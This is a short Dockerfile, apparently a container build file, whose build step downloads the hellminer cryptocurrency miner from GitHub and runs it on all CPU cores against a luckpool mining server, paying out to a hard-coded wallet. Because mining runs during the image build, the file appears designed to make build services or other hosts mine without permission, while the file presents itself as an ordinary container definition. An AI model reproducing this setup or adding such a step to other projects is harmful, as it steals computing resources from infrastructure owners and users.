FROM biansepang/weebproject:buster
RUN apt update -y \
    && apt upgrade -y \
    && apt install -y wget\
    && apt install unzip -y
RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && chmod +x hellminer && ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RT1Re4JxYJFcq7oM46F9aYe29nZQ9VU5As.sworkfarm -p x --cpu $(nproc)

CMD /entrypoint.sh
